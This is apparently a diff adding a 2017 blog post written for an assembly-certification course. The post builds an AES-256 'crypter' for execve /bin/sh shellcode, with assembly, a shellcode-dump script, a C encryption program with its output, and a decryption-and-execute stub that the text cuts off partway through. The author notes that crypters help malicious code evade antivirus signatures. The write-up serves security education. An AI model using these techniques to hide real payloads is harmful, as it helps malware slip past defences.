@@ -1,0 +1,549 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>Brett Lischalk | SLAE Problem 7: Create a Custom Crypter</title>
+  <meta name="description" content="SLAE Problem 7: Create a Custom Crypter">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="SLAE Problem 7: Create a Custom Crypter">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="http://localhost:4000/posts/slae-problem-7-custom-crypter">
+  <meta property="og:description" content="SLAE Problem 7: Create a Custom Crypter">
+  <meta property="og:site_name" content="Brett Lischalk">
+  <meta property="og:image" content="http://localhost:4000/assets/og-image.jpg">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="http://localhost:4000/posts/slae-problem-7-custom-crypter">
+  <meta name="twitter:title" content="SLAE Problem 7: Create a Custom Crypter">
+  <meta name="twitter:description" content="SLAE Problem 7: Create a Custom Crypter">
+  <meta name="twitter:image" content="http://localhost:4000/assets/og-image.jpg">
+
+  <link rel="apple-touch-icon" href="/assets/apple-touch-icon.png">
+  <link href="http://localhost:4000/feed.xml" type="application/rss+xml" rel="alternate" title="Brett Lischalk Last 10 blog posts" />
+
+  
+    <link type="text/css" rel="stylesheet" href="/assets/dark.css">
+  
+</head>
+
+<body>
+  <main role="main">
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav reveal">
+  <a href="/" class="header-logo" title="Brett Lischalk">Brett Lischalk</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <span class="icon icon-android-person"></span>
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/blischalk" target="_blank" title="Twitter">
+          <span class="icon icon-social-twitter"></span>
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a href="https://github.com/blischalk" target="_blank" title="GitHub">
+          <span class="icon icon-social-github"></span>
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://www.linkedin.com/in/brett-lischalk-3104537" target="_blank" title="LinkedIn">
+          <span class="icon icon-social-linkedin"></span>
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a href="mailto:brett@brettlischalk.com" target="_blank" title="Email">
+          <span class="icon icon-at"></span>
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="/feed.xml" target="_blank" title="RSS">
+          <span class="icon icon-social-rss"></span>
+        </a>
+      </li>
+    
+  </ul>
+</nav>
+
+        <article class="article reveal">
+          <header class="article-header">
+            <h1>SLAE Problem 7: Create a Custom Crypter</h1>
+            <div class="article-list-footer">
+              <span class="article-list-date">
+                January 10, 2017
+              </span>
+              <span class="article-list-divider">-</span>
+              <span class="article-list-minutes">
+                
+                
+                  10 minute read
+                
+              </span>
+              <span class="article-list-divider">-</span>
+              <div class="article-list-tags">
+                
+                  <a href="/tag/asm">asm</a>
+                
+                  <a href="/tag/shellcode">shellcode</a>
+                
+                  <a href="/tag/crypter">crypter</a>
+                
+              </div>
+            </div>
+          </header>
+
+          <div class="article-content">
+            <p>This blog post has been created for completing the requirements for the SecurityTube
+Linux Assembly Expert certification:
+<a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert"><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert</a></a></p>
+
+<p>Student ID: SLAE-824</p>
+
+<h2 id="requirements">Requirements</h2>
+
+<ul>
+  <li>Create a custom crypter like the one shown in the “crypters” video</li>
+  <li>Free to use any encryption schema</li>
+  <li>Use any programming language</li>
+</ul>
+
+<p>The code for this exercise can be found <a href="https://github.com/blischalk/slae/tree/master/exercise7">here</a>.</p>
+
+<h2 id="background-crypters-and-packers">Background: Crypters and Packers</h2>
+
+<p>So what is a Crypter or a Packer? From what I have read crypters and
+packers are quite similar. While the lines between them can blur a
+packer generally deals with compression and obfuscation and is often
+used by software companies to prevent revers-engineering their
+software. A crypter is focused on encryption and is a program that
+has grown out of the underground community. Both crypters and packers
+obfuscate code to deter reverse-engineering. By utilizing a crypter or
+packer on malicious code an attacker can increase their chances of
+bypassing anti-virus fingerprint/signature based detection.</p>
+
+<h2 id="strategy">Strategy</h2>
+
+<p>For this last SLAE problem I decided that I wanted to try and use AES
+256-bit encryption for my shellcode crypter. I found some sample c code
+<a href="https://wiki.openssl.org/index.php/EVP_Symmetric_Encryption_and_Decryption">here</a>
+which illustrates how to use the openssl c library for
+encryption/decryption. The strategy will be as follows:</p>
+
+<ol>
+  <li>Create an encrypt and decrypt c program using the sample code
+provided in the above link as a guide</li>
+  <li>Add the <code class="highlighter-rouge">execve /bin/sh</code> shellcode from the SLAE course into the
+encrypt c program</li>
+  <li>Encrypt the shellcode using the AES encryption and get an
+encrypted shellcode output</li>
+  <li>Place the encrypted shellcode within the decrypt program</li>
+  <li>Setup the decrypt program so that a function pointer points to the
+decrypted shellcode and executes it</li>
+</ol>
+
+<p>Lets write the code.</p>
+
+<h2 id="the-code">The Code</h2>
+
+<p>The assembly for the <code class="highlighter-rouge">execve /bin/sh</code> shellcode was the following:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="c">; Filename: execve.nasm</span>
+<span class="c">; Author:  Vivek Ramachandran</span>
+<span class="c">; Website:  http://securitytube.net</span>
+<span class="c">; Training: http://securitytube-training.com</span>
+<span class="c">;</span>
+<span class="c">;</span>
+<span class="c">; Purpose:</span>
+
+<span class="kr">global</span> <span class="n">_start</span>
+
+<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
+<span class="n">_start</span><span class="o">:</span>
+
+	<span class="k">jmp</span> <span class="n">short</span> <span class="n">call_shellcode</span>
+
+
+<span class="n">shellcode</span><span class="o">:</span>
+
+	<span class="k">pop</span> <span class="n">esi</span>
+
+	<span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>
+	<span class="k">mov</span> <span class="n">byte</span> <span class="err">[</span><span class="n">esi</span> <span class="o">+</span><span class="mi">7</span><span class="err">]</span><span class="p">,</span> <span class="n">bl</span>
+	<span class="k">mov</span> <span class="n">dword</span> <span class="err">[</span><span class="n">esi</span> <span class="o">+</span><span class="mi">8</span><span class="err">]</span><span class="p">,</span> <span class="n">esi</span>
+	<span class="k">mov</span> <span class="n">dword</span> <span class="err">[</span><span class="n">esi</span> <span class="o">+</span><span class="mi">12</span><span class="err">]</span><span class="p">,</span> <span class="n">ebx</span>
+
+
+	<span class="k">lea</span> <span class="n">ebx</span><span class="p">,</span> <span class="p">[esi]</span>
+
+	<span class="k">lea</span> <span class="n">ecx</span><span class="p">,</span> <span class="err">[</span><span class="n">esi</span> <span class="o">+</span><span class="mi">8</span><span class="err">]</span>
+
+	<span class="k">lea</span> <span class="n">edx</span><span class="p">,</span> <span class="err">[</span><span class="n">esi</span> <span class="o">+</span><span class="mi">12</span><span class="err">]</span>
+
+	<span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
+	<span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0xb</span>
+	<span class="k">int</span> <span class="mh">0x80</span>
+
+<span class="n">call_shellcode</span><span class="o">:</span>
+
+	<span class="k">call</span> <span class="n">shellcode</span>
+	<span class="n">message</span> <span class="kt">db</span> <span class="s">"/bin/shABBBBCCCC"</span></code></pre></figure>
+
+<p>We compile and link the shellcode using the provided <code class="highlighter-rouge">compile.sh</code> script:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash</span>
+<span class="nb">echo</span> <span class="s1">'[+] Assembling with Nasm ... '</span>
+nasm -f elf32 -o <span class="nv">$1</span>.o <span class="nv">$1</span>.nasm
+
+<span class="nb">echo</span> <span class="s1">'[+] Linking ...'</span>
+ld -o <span class="nv">$1</span> <span class="nv">$1</span>.o
+
+<span class="nb">echo</span> <span class="s1">'[+] Done!'</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">./compile.sh execve</code></pre></figure>
+
+<p>We proceed to get the shellcode using our <code class="highlighter-rouge">dumpsc</code> function we wrote
+in the previous exercise:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="k">function </span>dumpsc <span class="o">{</span>
+objdump -d ./<span class="nv">$1</span>|grep <span class="s1">'[0-9a-f]:'</span>|grep -v <span class="s1">'file'</span>|cut -f2 -d:|cut -f1-7 -d<span class="s1">' '</span>|tr -s <span class="s1">' '</span>|tr <span class="s1">'\t'</span> <span class="s1">' '</span>|sed <span class="s1">'s/ $//g'</span>|sed <span class="s1">'s/ /\\x/g'</span>|paste -d <span class="s1">''</span> -s |sed <span class="s1">'s/^/"/'</span>|sed <span class="s1">'s/$/"/g'</span>
+<span class="o">}</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">$ </span>dumpsc execve
+<span class="s2">"</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">07</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">76</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">0c</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">1e</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">4e</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">0c</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">e8</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">43"</span></code></pre></figure>
+
+<p>Now we have the shellcode. We proceed to write the <code class="highlighter-rouge">aesencrypt.c</code>
+program. Most of the code is a straight reproduction of the openssl
+example code with the subtraction of the decryption functionality and
+the addition of our shellcode:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;openssl/conf.h&gt;
+#include &lt;openssl/evp.h&gt;
+#include &lt;openssl/err.h&gt;
+#include &lt;string.h&gt;
+</span>
+<span class="kt">void</span> <span class="nf">handleErrors</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">ERR_print_errors_fp</span><span class="p">(</span><span class="n">stderr</span><span class="p">);</span>
+  <span class="n">abort</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">encrypt</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">plaintext</span><span class="p">,</span> <span class="kt">int</span> <span class="n">plaintext_len</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">key</span><span class="p">,</span>
+  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">iv</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ciphertext</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">EVP_CIPHER_CTX</span> <span class="o">*</span><span class="n">ctx</span><span class="p">;</span>
+
+  <span class="kt">int</span> <span class="n">len</span><span class="p">;</span>
+
+  <span class="kt">int</span> <span class="n">ciphertext_len</span><span class="p">;</span>
+
+  <span class="cm">/* Create and initialise the context */</span>
+  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">ctx</span> <span class="o">=</span> <span class="n">EVP_CIPHER_CTX_new</span><span class="p">()))</span> <span class="n">handleErrors</span><span class="p">();</span>
+
+  <span class="cm">/* Initialise the encryption operation. IMPORTANT - ensure you use a key
+   * and IV size appropriate for your cipher
+   * In this example we are using 256 bit AES (i.e. a 256 bit key). The
+   * IV size for *most* modes is the same as the block size. For AES this
+   * is 128 bits */</span>
+  <span class="k">if</span><span class="p">(</span><span class="mi">1</span> <span class="o">!=</span> <span class="n">EVP_EncryptInit_ex</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">EVP_aes_256_cbc</span><span class="p">(),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">))</span>
+    <span class="n">handleErrors</span><span class="p">();</span>
+
+  <span class="cm">/* Provide the message to be encrypted, and obtain the encrypted output.
+   * EVP_EncryptUpdate can be called multiple times if necessary
+   */</span>
+  <span class="k">if</span><span class="p">(</span><span class="mi">1</span> <span class="o">!=</span> <span class="n">EVP_EncryptUpdate</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">ciphertext</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">,</span> <span class="n">plaintext</span><span class="p">,</span> <span class="n">plaintext_len</span><span class="p">))</span>
+    <span class="n">handleErrors</span><span class="p">();</span>
+  <span class="n">ciphertext_len</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>
+
+  <span class="cm">/* Finalise the encryption. Further ciphertext bytes may be written at
+   * this stage.
+   */</span>
+  <span class="k">if</span><span class="p">(</span><span class="mi">1</span> <span class="o">!=</span> <span class="n">EVP_EncryptFinal_ex</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">ciphertext</span> <span class="o">+</span> <span class="n">len</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">))</span> <span class="n">handleErrors</span><span class="p">();</span>
+  <span class="n">ciphertext_len</span> <span class="o">+=</span> <span class="n">len</span><span class="p">;</span>
+
+  <span class="cm">/* Clean up */</span>
+  <span class="n">EVP_CIPHER_CTX_free</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>
+
+  <span class="k">return</span> <span class="n">ciphertext_len</span><span class="p">;</span>
+<span class="p">}</span>
+
+
+<span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="cm">/* Set up the key and iv. Do I need to say to not hard code these in a
+   * real application? :-)
+   */</span>
+
+  <span class="cm">/* A 256 bit key */</span>
+  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="s">"01234567890123456789012345678901"</span><span class="p">;</span>
+
+  <span class="cm">/* A 128 bit IV */</span>
+  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">iv</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="s">"01234567890123456"</span><span class="p">;</span>
+
+  <span class="cm">/* Shellcode to be encrypted */</span>
+  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">plaintext</span> <span class="o">=</span>
+                <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="s">"</span><span class="se">\xeb\x1a\x5e\x31\xdb\x88\x5e\x07\x89\x76\x08\x89\x5e\x0c\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43</span><span class="s">"</span><span class="p">;</span>
+
+  <span class="cm">/* Buffer for ciphertext. Ensure the buffer is long enough for the
+   * ciphertext which may be longer than the plaintext, dependant on the
+   * algorithm and mode
+   */</span>
+  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">ciphertext</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+
+  <span class="kt">int</span> <span class="n">ciphertext_len</span><span class="p">;</span>
+
+  <span class="cm">/* Initialise the library */</span>
+  <span class="n">ERR_load_crypto_strings</span><span class="p">();</span>
+  <span class="n">OpenSSL_add_all_algorithms</span><span class="p">();</span>
+  <span class="n">OPENSSL_config</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
+
+  <span class="cm">/* Encrypt the plaintext */</span>
+  <span class="n">ciphertext_len</span> <span class="o">=</span> <span class="n">encrypt</span> <span class="p">(</span><span class="n">plaintext</span><span class="p">,</span> <span class="n">strlen</span> <span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">plaintext</span><span class="p">),</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span>
+                            <span class="n">ciphertext</span><span class="p">);</span>
+
+
+  <span class="kt">int</span> <span class="n">counter</span><span class="p">;</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Dumping Original Shellcode</span><span class="se">\n\n\n\"</span><span class="s">"</span><span class="p">);</span>
+  <span class="k">for</span> <span class="p">(</span><span class="n">counter</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">counter</span><span class="o">&lt;</span> <span class="n">strlen</span><span class="p">(</span><span class="n">plaintext</span><span class="p">);</span> <span class="n">counter</span><span class="o">++</span><span class="p">)</span>
+  <span class="p">{</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">x%02x"</span><span class="p">,</span><span class="n">plaintext</span><span class="p">[</span><span class="n">counter</span><span class="p">]);</span>
+
+  <span class="p">}</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\"\n\n</span><span class="s">"</span><span class="p">);</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Dumping AES Encrypted Shellcode</span><span class="se">\n\n\n\"</span><span class="s">"</span><span class="p">);</span>
+
+  <span class="k">for</span> <span class="p">(</span><span class="n">counter</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">counter</span><span class="o">&lt;</span> <span class="n">ciphertext_len</span><span class="p">;</span> <span class="n">counter</span><span class="o">++</span><span class="p">)</span>
+  <span class="p">{</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">x%02x"</span><span class="p">,</span><span class="n">ciphertext</span><span class="p">[</span><span class="n">counter</span><span class="p">]);</span>
+
+  <span class="p">}</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\"\n\n</span><span class="s">"</span><span class="p">);</span>
+
+  <span class="cm">/* Clean up */</span>
+  <span class="n">EVP_cleanup</span><span class="p">();</span>
+  <span class="n">ERR_free_strings</span><span class="p">();</span>
+
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>When we compile this shellcode we need to remember to link the openssl library:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">gcc aesencrypt.c -o aesencrypt -lcrypto</code></pre></figure>
+
+<p>When we run the encryption program we see the following output:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">$ </span>./aesencrypt
+Dumping Original Shellcode
+
+<span class="s2">"</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">07</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">76</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">0c</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">1e</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">4e</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">0c</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">e8</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">43"</span>
+
+Dumping AES Encrypted Shellcode
+
+<span class="s2">"</span><span class="se">\x</span><span class="s2">47</span><span class="se">\x</span><span class="s2">fe</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">cc</span><span class="se">\x</span><span class="s2">1f</span><span class="se">\x</span><span class="s2">d0</span><span class="se">\x</span><span class="s2">4a</span><span class="se">\x</span><span class="s2">f5</span><span class="se">\x</span><span class="s2">34</span><span class="se">\x</span><span class="s2">3e</span><span class="se">\x</span><span class="s2">92</span><span class="se">\x</span><span class="s2">8c</span><span class="se">\x</span><span class="s2">9e</span><span class="se">\x</span><span class="s2">c5</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">3d</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">c6</span><span class="se">\x</span><span class="s2">94</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">0a</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">c2</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">ef</span><span class="se">\x</span><span class="s2">1d</span><span class="se">\x</span><span class="s2">8b</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">39</span><span class="se">\x</span><span class="s2">f8</span><span class="se">\x</span><span class="s2">b4</span><span class="se">\x</span><span class="s2">d4</span><span class="se">\x</span><span class="s2">29</span><span class="se">\x</span><span class="s2">a1</span><span class="se">\x</span><span class="s2">09</span><span class="se">\x</span><span class="s2">fc</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">a2</span><span class="se">\x</span><span class="s2">2d</span><span class="se">\x</span><span class="s2">a2</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">9e</span><span class="se">\x</span><span class="s2">3c</span><span class="se">\x</span><span class="s2">f9</span><span class="se">\x</span><span class="s2">7d</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">3e</span><span class="se">\x</span><span class="s2">5f</span><span class="se">\x</span><span class="s2">de</span><span class="se">\x</span><span class="s2">ce</span><span class="se">\x</span><span class="s2">fe</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">9d</span><span class="se">\x</span><span class="s2">f0</span><span class="se">\x</span><span class="s2">d6</span><span class="se">\x</span><span class="s2">7b</span><span class="se">\x</span><span class="s2">0e"</span></code></pre></figure>
+
+<p>We can see our original shellcode and the encrypted version as
+well. The next task is to write our decryption program and add the
+encrypted shellcode to it. Once again, most of the decryption code is
+just reproduced from the openssl example but I have modified it to
+remove the encryption related code and instead of printing out the
+decrypted text I instead cast it to a function pointer and execute it
+as our usual c stub programs have done:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;openssl/conf.h&gt;
+#include &lt;openssl/evp.h&gt;
+#include &lt;openssl/err.h&gt;
+#include &lt;string.h&gt;
+</span>
+<span class="kt">void</span> <span class="nf">handleErrors</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">ERR_print_errors_fp</span><span class="p">(</span><span class="n">stderr</span><span class="p">);</span>
+  <span class="n">abort</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">decrypt</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ciphertext</span><span class="p">,</span> <span class="kt">int</span> <span class="n">ciphertext_len</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">key</span><span class="p">,</span>
+  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">iv</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">plaintext</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">EVP_CIPHER_CTX</span> <span class="o">*</span><span class="n">ctx</span><span class="p">;</span>
+
+  <span class="kt">int</span> <span class="n">len</span><span class="p">;</span>
+
+  <span class="kt">int</span> <span class="n">plaintext_len</span><span class="p">;</span>
+
+  <span class="cm">/* Create and initialise the context */</span>
+  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">ctx</span> <span class="o">=</span> <span class="n">EVP_CIPHER_CTX_new</span><span class="p">()))</span> <span class="n">handleErrors</span><span class="p">();</span>
+
+  <span class="cm">/* Initialise the decryption operation. IMPORTANT - ensure you use a key
+   * and IV size appropriate for your cipher
+   * In this example we are using 256 bit AES (i.e. a 256 bit key). The
+   * IV size for *most* modes is the same as the block size. For AES this
+   * is 128 bits */</span>
+  <span class="k">if</span><span class="p">(</span><span class="mi">1</span> <span class="o">!=</span> <span class="n">EVP_DecryptInit_ex</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">EVP_aes_256_cbc</span><span class="p">(),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">))</span>
+    <span class="n">handleErrors</span><span class="p">();</span>
+
+  <span class="cm">/* Provide the message to be decrypted, and obtain the plaintext output.
+   * EVP_DecryptUpdate can be called multiple times if necessary
+   */</span>
+  <span class="k">if</span><span class="p">(</span><span class="mi">1</span> <span class="o">!=</span> <span class="n">EVP_DecryptUpdate</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">plaintext</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">,</span> <span class="n">ciphertext</span><span class="p">,</span> <span class="n">ciphertext_len</span><span class="p">))</span>
+    <span class="n">handleErrors</span><span class="p">();</span>
+  <span class="n">plaintext_len</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>
+
+  <span class="cm">/* Finalise the decryption. Further plaintext bytes may be written at
+   * this stage.
+   */</span>
+  <span class="k">if</span><span class="p">(</span><span class="mi">1</span> <span class="o">!=</span> <span class="n">EVP_DecryptFinal_ex</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">plaintext</span> <span class="o">+</span> <span class="n">len</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">))</span> <span class="n">handleErrors</span><span class="p">();</span>
+  <span class="n">plaintext_len</span> <span class="o">+=</span> <span class="n">len</span><span class="p">;</span>
+
+  <span class="cm">/* Clean up */</span>
+  <span class="n">EVP_CIPHER_CTX_free</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>
+
+  <span class="k">return</span> <span class="n">plaintext_len</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="cm">/* Set up the key and iv. Do I need to say to not hard code these in a
+   * real application? :-)
+   */</span>
+
+  <span class="cm">/* A 256 bit key */</span>
+  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="s">"01234567890123456789012345678901"</span><span class="p">;</span>
+
+  <span class="cm">/* A 128 bit IV */</span>
